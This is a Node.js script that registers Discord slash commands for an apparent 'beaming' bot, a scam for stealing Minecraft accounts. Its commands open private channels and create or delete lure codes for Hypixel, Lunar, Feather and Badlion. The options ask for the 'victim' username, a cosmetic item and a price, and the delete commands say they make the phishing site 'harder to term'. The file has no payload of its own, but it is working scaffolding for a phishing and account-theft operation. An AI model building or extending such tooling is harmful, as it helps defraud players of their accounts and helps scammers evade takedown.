require("dotenv").config();
const { REST, Routes, ApplicationCommandOptionType } = require("discord.js");

const commands = [
  {
    name: 'start',
    description: 'Creates a private channel to start beaming with.',
    options: [
      {
        name: 'type',
        description: 'what type of beaming link you want.',
        type: ApplicationCommandOptionType.String,
        required: true,
        choices: [
          {
            name: 'hypixel',
            value: 'Hypixel'
          },
          {
            name: 'lunar',
            value: 'Lunar'
          },
          {
            name: 'feather',
            value: 'Feather'
          },
          {
            name: 'badlion',
            value: 'Badlion'
          }
        ]
      }
    ]
  },
  {
    name: "terminate-session",
    description: "deletes the channel you created",
  },
  {
    name: "hypixel-create-code",
    description: "Creates a code with a cosmetic and a price.",
    options: [
      {
        name: "item",
        description: "The name of the cosmetic the victim wants",
        type: ApplicationCommandOptionType.String,
        required: true,
      },
      {
        name: "target-username",
        description: "The username of the victim",
        type: ApplicationCommandOptionType.String,
        required: true,
      },
      {
        name: "price",
        description: "The price of the cosmetic your victim wants",
        type: ApplicationCommandOptionType.String,
        required: true,
      },
    ],
  },
  {
    name: "hypixel-delete-code",
    description: "deletes the code to make the site harder to term",
    options: [{
      name: "code",
      description: "The code given to you when the link was generated",
      type: ApplicationCommandOptionType.String,
      required: true,
    },
  ],
  },
  {
    name: "lunar-create-code",
    description: "Creates a code with a cosmetic and a price.",
    options: [
      {
        name: "item",
        description: "The name of the cosmetic the victim wants",
        type: ApplicationCommandOptionType.String,
        required: true,
      },
      {
        name: "price",
        description: "The price of the cosmetic your victim wants",
        type: ApplicationCommandOptionType.String,
        required: true,
      },
    ],
  },
  {
    name: "lunar-delete-code",
    description: "deletes the code to make the site harder to term",
    options: [{
      name: "code",
      description: "The code given to you when the link was generated",
      type: ApplicationCommandOptionType.String,
      required: true,
    },
  ],
  },
  {
    name: "feather-create-code",
    description: "Creates a code with a cosmetic and a price.",
    options: [
      {
        name: "item",
        description: "The name of the cosmetic the victim wants",
        type: ApplicationCommandOptionType.String,
        required: true,
      },
      {
        name: "target-username",
        description: "The username of the victim",
        type: ApplicationCommandOptionType.String,
        required: true,
      },
      {
        name: "price",
        description: "The price of the cosmetic your victim wants",
        type: ApplicationCommandOptionType.String,
        required: true,
      },
    ],
  },
  {
    name: "feather-delete-code",
    description: "deletes the code to make the site harder to term",
    options: [{
      name: "code",
      description: "The code given to you when the link was generated",
      type: ApplicationCommandOptionType.String,
      required: true,
    },
  ],
  },
  {
    name: "badlion-create-code",
    description: "Creates a code with a cosmetic and a price.",
    options: [
      {
        name: "item",
        description: "The name of the cosmetic the victim wants",
        type: ApplicationCommandOptionType.String,
        required: true,
      },
      {
        name: "price",
        description: "The price of the cosmetic your victim wants",
        type: ApplicationCommandOptionType.String,
        required: true,
      },
    ],
  },
  {
    name: "badlion-delete-code",
    description: "deletes the code to make the site harder to term",
    options: [{
      name: "code",
      description: "The code given to you when the link was generated",
      type: ApplicationCommandOptionType.String,
      required: true,
    },
  ],
  },
];

const rest = new REST({ version: "10" }).setToken(process.env.TOKEN);

(async () => {
  try {
    console.log("Registering sash commands...");

    await rest.put(
      Routes.applicationGuildCommands(
        process.env.CLIENT_ID,
        process.env.GUILD_ID
      ),
      { body: commands }
    );

    console.log("Slash commands were registered successfully!");
  } catch (error) {
    console.log(`There was an error: ${error}`);
  }
})();